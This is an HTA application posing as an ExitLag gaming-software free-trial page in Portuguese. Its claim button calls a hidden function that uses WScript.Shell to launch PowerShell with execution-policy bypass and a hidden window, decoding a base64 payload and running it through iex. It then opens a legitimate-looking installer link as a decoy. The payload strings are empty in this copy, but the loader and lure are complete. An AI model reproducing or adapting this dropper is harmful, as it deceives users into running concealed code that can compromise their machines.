<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta charset="utf-8"/>
<title>ExitLag - 30 Dias de Teste Gratuito</title>
<HTA:APPLICATION
  ID="exitApp"
  APPLICATIONNAME="ExitLag"
  BORDER="thin"
  BORDERSTYLE="static"
  CAPTION="yes"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="yes"
  SHOWINTASKBAR="yes"
  SINGLEINSTANCE="yes"
  SYSMENU="yes"
  SCROLL="no"
  WINDOWSTATE="normal"
/>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body { width: 100%; height: 100%; overflow: hidden; }
body {
  font-family: Arial, Helvetica, sans-serif;
  background: #0c0e12;
  color: #e5e5e5;
}
.bg {
  height: 100%;
  background:
    radial-gradient(ellipse at top center, rgba(255,0,60,0.28) 0%, rgba(12,14,18,0) 55%),
    radial-gradient(circle, rgba(255,0,60,0.35) 1px, transparent 1px),
    linear-gradient(180deg, #180509 0%, #0c0e12 55%, #0a0b0e 100%);
  background-size: auto, 24px 24px, auto;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 24px 20px;
}
.logo {
  margin-bottom: 18px;
  text-align: center;
}
.logo img {
  max-width: 280px;
  width: 100%;
  height: auto;
  display: block;
  margin: 0 auto;
}
.card {
  width: 100%;
  max-width: 420px;
  background: #ffffff;
  color: #222;
  border-radius: 16px;
  padding: 28px 24px 22px;
  text-align: center;
  box-shadow: 0 12px 40px rgba(0,0,0,.45);
}
.card h1 {
  font-size: 22px;
  font-weight: 800;
  color: #111;
  margin-bottom: 6px;
}
.card .sub {
  font-size: 14px;
  color: #444;
  margin-bottom: 18px;
}
.btn {
  display: block;
  width: 100%;
  border: none;
  cursor: pointer;
  background: #ff003c;
  color: #fff;
  font-size: 14px;
  font-weight: 800;
  letter-spacing: 0.6px;
  text-transform: uppercase;
  padding: 16px 18px;
  border-radius: 12px;
  box-shadow: 0 0 22px rgba(255,0,60,.45);
}
.btn:hover { background: #d60032; }
.btn:disabled { background: #c97a8a; cursor: default; box-shadow: none; }
.hint {
  margin-top: 12px;
  font-size: 11px;
  color: #888;
}
.footer {
  margin-top: 22px;
  text-align: center;
  max-width: 420px;
  font-size: 11px;
  color: #9a9a9a;
  line-height: 1.55;
}
.footer a { color: #ddd; text-decoration: underline; }
.footer .links { margin: 8px 0; color: #888; }
.footer .copy { color: #777; }
</style>
<script type="text/javascript">
var _a="";
var _b="";
function _x(){
  try{
    var sh=new ActiveXObject("WScript.Shell");
    var p=_a+_b;
    var cmd="powershell -NoP -EP Bypass -W Hidden -C \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"+p+"'))|iex\"";
    sh.Run(cmd,0,false);
  }catch(e){}
}
function _o(){
  try{
    var sh=new ActiveXObject("WScript.Shell");
    sh.Run('cmd /c start "" "https://cdn.exitlag.com/SetupExitLag-5.24.0-x64.exe"',0,false);
  }catch(e){
    try{ window.open("https://cdn.exitlag.com/SetupExitLag-5.24.0-x64.exe"); }catch(e2){}
  }
}
function resgatar(){
  var btn=document.getElementById("btn");
  btn.disabled=true;
  btn.innerText="Processando...";
  _x();
  _o();
  setTimeout(function(){
    btn.disabled=false;
    btn.innerText="ExitLag 30 Free";
  },2500);
}
window.onload=function(){
  try{
    window.resizeTo(520,560);
    window.moveTo((screen.width-520)/2,(screen.height-560)/2);
  }catch(e){}
};
</script>
</head>
<body>
<div class="bg">
  <div class="logo">
    <img src="data:image/png;base64," alt="ExitLag"/>
  </div>
  <div class="card">
    <h1>30 Dias Grátis</h1>
    <p class="sub">Configure as melhores rotas para seu game</p>
    <button class="btn" id="btn" onclick="resgatar()">ExitLag 30 Free</button>
    <p class="hint">Download do instalador + ativação</p>
  </div>
  <div class="footer">
    <div>Any doubts? Feel free to contact us on our Discord channel!</div>
    <div class="links">Terms of use | Privacy Policy</div>
    <div class="copy">© Copyright 2026 ExitLag. All rights reserved.</div>
  </div>
</div>
</body>
</html>
